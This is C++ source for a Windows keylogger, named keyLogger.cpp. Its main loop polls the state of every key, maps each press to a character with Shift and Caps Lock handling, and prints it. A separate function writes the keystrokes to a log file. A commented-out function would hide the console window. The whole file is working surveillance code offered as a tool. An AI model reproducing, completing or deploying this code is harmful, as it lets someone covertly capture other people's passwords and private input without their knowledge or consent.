// keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <cctype>
#include <iomanip>
//void Stealth();
//void saveToFile(int keyStroke, string &previousKey, ofstream &outfile);
using namespace std;

int main()
{ 
    ostringstream strm;
    while(true)
    {
        for (int i = 0; i < 256; i++)
        {
            if (GetAsyncKeyState(i) & 0b1)
            {
                cout << i << "->";
                bool shiftIsDown = GetAsyncKeyState(VK_LSHIFT);
                if (char(i) >= 'A' && char(i) <= 'Z') 
                {
                    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || shiftIsDown)
                    {
                        cout << char(i) << endl;
                    }
                    else 
                    {
                        cout << char(tolower(char(i))) << endl;
                    }
                }
                else if ((i > 47 && i < 58))
                {
                    if (!shiftIsDown)
                    {
                        ostringstream strm;
                        strm << hex << int(i);
                        cout << char(i);
                    }
                    else
                    {
                        switch (char(i))
                        {
                        case '0':
                            cout << ")";
                            break;
                        case '1':
                            cout << "!";
                            break;
                        case '2':
                            cout << "@";
                            break;
                        case '3':
                            cout << "#";
                            break;
                        case '4':
                            cout << "$";
                            break;
                        case '5':
                            cout << "%";
                            break;
                        case '6':
                            cout << "^";
                            break;
                        case '7':
                            cout << "&";
                            break;
                        case '8':
                            cout << "*";
                            break;
                        case '9':
                            cout << "(";
                            break;
                        }
                    }
                }
                else
                {
                    switch (i) {
                    case VK_DELETE:
                        cout << "[Delete]";
                        break;
                    case VK_BACK:
                        cout << "[Backspace]";
                        break;
                    case VK_NUMPAD0:
                        cout << "0";
                        break;
                    case VK_NUMPAD1:
                        cout << "1";
                        break;
                    case VK_NUMPAD2:
                        cout << "2";
                        break;
                    case VK_NUMPAD3:
                        cout << "3";
                        break;
                    case VK_NUMPAD4:
                        cout << "4";
                        break;
                    case VK_NUMPAD5:
                        cout << "5";
                        break;
                    case VK_NUMPAD6:
                        cout << "6";
                        break;
                    case VK_NUMPAD7:
                        cout << "7";
                        break;
                    case VK_NUMPAD8:
                        cout << "8";
                        break;
                    case VK_NUMPAD9:
                        cout << "9";
                        break;
                    case VK_SPACE:
                        cout << "[Space]";
                        break;
                    }
                }
            }

        }
    }
}

/*void Stealth()
{
    int hide = 0;//this number determines what the window will do when executes. When 0 window is hidden.
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsleWindowClass", NULL);
    ShowWindow(Stealth, hide);
}*/
void saveToFile(int keyStroke, string& previousKey, ofstream& outfile)
{
    outfile.open("keyLog.txt", ios_base::out | ios_base::app);
    if (char(keyStroke) >= 'A' && char(keyStroke) <= 'Z')
    {
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || previousKey == "[Shift]")//If capslock is on OR if SHIFT is being held down 
        {
            outfile << char(keyStroke);
            previousKey = char(keyStroke);
        }
        else
        {
            outfile << char(tolower(char(keyStroke)));
            previousKey = char(keyStroke);
        }
    }
    else if (keyStroke > 47 && keyStroke < 58)//if it is between 1 and 9 in decimal
    {
        ostringstream strm;
        strm << hex << int(keyStroke);
        if (previousKey != "[Shift]")
        {
            outfile << char(keyStroke);
            previousKey = char(keyStroke);
        }
        else
        {
            switch (char(keyStroke)) 
            {
            case '0':
                outfile << ")";
                previousKey = ")";
                break;
            case '1':
                outfile << "!";
                previousKey = "!";
                break;
            case '2':
                outfile << "@";
                previousKey = "@";
                break;
            case '3':
                outfile << "#";
                previousKey = "#";
                break;
            case '4':
                outfile << "$";
                previousKey = "$";
                break;
            case '5':
                outfile << "%";
                previousKey = "%";
                break;
            case '6':
                outfile << "^";
                previousKey = "^";
                break;
            case '7':
                outfile << "&";
                previousKey = "&";
                break;
            case '8':
                outfile << "*";
                previousKey = "*";
                break;
            case '9':
                outfile << "(";
                previousKey = "(";
                break;
            }
        }
    }
    else
    {
        switch (keyStroke) {
        case VK_DELETE:
            outfile << "[Delete]";
            previousKey = "[Delete]";
            break;
        case VK_BACK:
            outfile << "[Backspace]";
            previousKey = "[Backspace]";
            break;
        case VK_NUMPAD0:
            outfile << "0";
            previousKey = "0";
            break;
        case VK_NUMPAD1:
            outfile << "1";
            previousKey = "1";
            break;
        case VK_NUMPAD2:
            outfile << "2";
            previousKey = "2";
            break;
        case VK_NUMPAD3:
            outfile << "3";
            previousKey = "3";
            break;
        case VK_NUMPAD4:
            outfile << "4";
            previousKey = "4";
            break;
        case VK_NUMPAD5:
            outfile << "5";
            previousKey = "5";
            break;
        case VK_NUMPAD6:
            outfile << "6";
            previousKey = "6";
            break;
        case VK_NUMPAD7:
            outfile << "7";
            previousKey = "7";
            break;
        case VK_NUMPAD8:
            outfile << "8";
            previousKey = "8";
            break;
        case VK_NUMPAD9:
            outfile << "9";
            previousKey = "9";
            break;
        case VK_LSHIFT:
            if(previousKey!= "[Shift]") previousKey = "[Shift]";
            break;
        case VK_RSHIFT:
            if (previousKey != "[Shift]") previousKey = "[Shift]";
            break;
        case VK_SPACE:
            outfile << "[Space]";
            previousKey = "[Space]";
            break;
        }
    }
    outfile.close();
}
